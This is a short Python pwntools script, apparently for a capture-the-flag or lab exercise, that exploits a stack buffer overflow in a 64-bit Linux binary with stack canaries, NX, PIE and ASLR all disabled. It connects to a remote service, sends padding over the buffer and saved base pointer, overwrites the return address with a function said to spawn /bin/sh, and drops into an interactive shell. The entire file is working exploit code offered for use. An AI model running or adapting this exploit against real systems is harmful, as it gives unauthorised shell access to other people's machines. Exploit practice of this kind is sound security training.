#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits All disabled

# Checksec

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)

# /proc/sys/kernel/randomize_va_space 0

from pwn import *

context(os='linux', arch='amd64')

p = remote("10.10.10.10", 4444)

buffer = ("A"*32).encode()
rbp = ("B"*8).encode()

# 0x00400686 vuln. Jump to a vulnerable function that executes /bin/sh
rip = p64(0x00400686)

p.recvuntil(b"What's your name: ")
p.sendline(buffer + rbp  + rip)
p.interactive()
